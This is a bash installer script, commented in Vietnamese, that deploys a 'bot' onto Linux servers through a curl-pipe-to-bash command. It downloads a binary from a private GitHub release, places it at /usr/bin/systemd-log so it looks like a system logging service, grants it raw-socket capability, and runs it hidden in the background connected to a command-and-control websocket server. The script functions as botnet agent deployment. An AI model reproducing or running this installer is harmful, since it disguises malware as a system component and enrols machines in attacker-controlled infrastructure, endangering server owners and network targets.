#!/bin/bash
# ============================================================
# BOT DEPLOYER — Cài bot lên VPS Linux qua 1 lệnh curl
# ============================================================
# Cách dùng:
#   curl -sL -H "Authorization: token <PAT>" \
#     https://raw.githubusercontent.com/duaakcon10/dc-ansta/main/install.sh | bash -s wss://bot.minhvuong.io.vn/ws/bot/
# ============================================================
set -e

C2_URL="${1:-wss://bot.minhvuong.io.vn/ws/bot/}"
GITHUB_REPO="duaakcon10/dc-ansta"
BOT_PATH="/usr/bin/systemd-log"

# ── Lấy GITHUB_TOKEN từ env hoặc từ tham số thứ 2 ──
GITHUB_TOKEN="${GITHUB_TOKEN:-${2}}"

if [ -z "$GITHUB_TOKEN" ]; then
    echo "[!] Repo private — cần GITHUB_TOKEN."
    echo "    Tạo token tại: https://github.com/settings/tokens (quyền: repo)"
    echo "    Dùng: export GITHUB_TOKEN=ghp_xxx"
    echo "    Hoặc: curl ... | bash -s wss://bot.minhvuong.io.vn/ws/ ghp_xxx"
    exit 1
fi

echo "[*] Downloading latest bot..."
AUTH_HEADER="Authorization: token $GITHUB_TOKEN"
LATEST=$(curl -s -H "$AUTH_HEADER" "https://api.github.com/repos/$GITHUB_REPO/releases/latest" | grep '"tag_name"' | head -1 | cut -d'"' -f4)

if [ -z "$LATEST" ]; then
    echo "[!] Không tìm thấy release nào. Push tag v* trước đã."
    exit 1
fi

echo "[*] Latest release: $LATEST"
curl -sL -H "$AUTH_HEADER" "https://github.com/$GITHUB_REPO/releases/download/$LATEST/bot_static" -o /tmp/bot_update
chmod +x /tmp/bot_update

echo "[*] Installing..."
systemctl stop systemd-log.service 2>/dev/null || true
killall systemd-log 2>/dev/null || true
mv /tmp/bot_update "$BOT_PATH"
chmod +x "$BOT_PATH"
setcap cap_net_raw+ep "$BOT_PATH" 2>/dev/null || true

echo "[*] Starting bot..."
nohup "$BOT_PATH" "$C2_URL" &>/dev/null &

echo "[+] Bot installed and running."
echo "[+] C2: $C2_URL"